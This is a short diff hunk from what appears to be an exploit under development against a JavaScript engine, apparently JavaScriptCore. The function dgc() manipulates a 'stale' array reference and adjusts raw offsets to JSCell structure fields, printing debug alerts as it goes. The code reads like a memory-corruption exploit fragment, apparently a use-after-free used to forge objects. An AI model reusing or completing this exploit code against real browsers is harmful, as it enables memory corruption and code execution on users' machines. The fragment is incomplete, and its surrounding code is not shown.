@@ -234,6 +234,10 @@ function dgc() {
 				//	uint8:	TypeInfo::InlineTypeFlags m_flags;
 				//	uint8:	uint8_t m_gcData;
 				
+				alert("About to try weird thingy");
+				stale[0] = stale[1]['a'];
+				alert("Raw JSCell:" + bufs[i][k].toString(16));
+				
 				//ORIGINAL: bufs[i][k] += 0x10; 
 				bufs[i][k] += 0x8; 
 				alert("Offset bufs[i][k] by 8");
